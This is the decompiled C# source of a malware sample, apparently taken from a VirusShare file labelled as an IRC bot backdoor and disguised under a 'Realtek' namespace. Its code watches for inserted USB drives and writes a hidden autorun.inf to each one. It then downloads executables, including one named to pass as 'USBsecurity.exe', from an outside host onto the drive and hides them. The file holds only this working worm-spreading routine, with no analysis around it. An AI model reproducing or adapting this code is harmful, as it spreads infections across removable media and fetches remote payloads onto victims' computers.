// Decompiled with JetBrains decompiler
// Type: Realtek.Usb
// Assembly: Realtek, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D76B5F46-2334-4413-9FB7-17692F948558
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.u-ef0b787b17c95db8b20bb6d9cfcd867d72ab60807c74c3ee2df2c4e0e509958f.exe

using System;
using System.IO;
using System.Management;
using System.Net;
using System.Threading;

namespace Realtek
{
  internal class Usb
  {
    private static ManagementEventWatcher w;

    public static void Listen()
    {
      ManagementScope scope = new ManagementScope("root\\CIMV2");
      scope.Options.EnablePrivileges = true;
      try
      {
        Usb.w = new ManagementEventWatcher(scope, (EventQuery) new WqlEventQuery()
        {
          EventClassName = "__InstanceCreationEvent",
          WithinInterval = new TimeSpan(0, 0, 3),
          Condition = "TargetInstance ISA 'Win32_USBControllerdevice'"
        });
        Usb.w.EventArrived += new EventArrivedEventHandler(Usb.UsbAdded);
        Usb.w.Start();
      }
      catch
      {
        if (Usb.w == null)
          return;
        Usb.w.Stop();
      }
    }

    public static void UsbAdded(object sender, EventArgs e)
    {
      WebClient webClient = new WebClient();
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.DriveType == DriveType.Removable)
        {
          if (System.IO.File.Exists(drive.Name + "autorun.inf"))
            System.IO.File.Delete(drive.Name + "autorun.inf");
          if (System.IO.File.Exists(drive.Name + "autorun.exe"))
            System.IO.File.Delete(drive.Name + "autorun.exe");
          StreamWriter streamWriter = new StreamWriter(drive.Name + "autorun.inf");
          streamWriter.WriteLine("[autorun]");
          streamWriter.WriteLine("label=USB Drive");
          streamWriter.WriteLine("icon=USBdrive.ico");
          streamWriter.WriteLine("open=autorun.exe");
          streamWriter.WriteLine("shellexecute=autorun.exe");
          streamWriter.WriteLine("action=USB Drive explorer");
          streamWriter.Close();
          System.IO.File.SetAttributes(drive.Name + "autorun.inf", System.IO.File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
          try
          {
            webClient.DownloadFile("http://www.share-finder.com/tachatte/autorun.exe", drive.Name + "autorun.exe");
            webClient.DownloadFile("http://www.share-finder.com/tachatte/autorun.exe", drive.Name + "USBsecurity.exe");
            webClient.DownloadFile("http://www.share-finder.com/tachatte/USBdrive.ico", drive.Name + "USBdrive.ico");
            System.IO.File.SetAttributes(drive.Name + "autorun.exe", System.IO.File.GetAttributes(drive.Name + "autorun.exe") | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
            System.IO.File.SetAttributes(drive.Name + "USBdrive.ico", System.IO.File.GetAttributes(drive.Name + "USBdrive.ico") | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
          }
          finally
          {
            Thread.Sleep(2000);
          }
        }
        if (Usb.w != null)
          Usb.w.Stop();
        Usb.w.Start();
      }
    }
  }
}
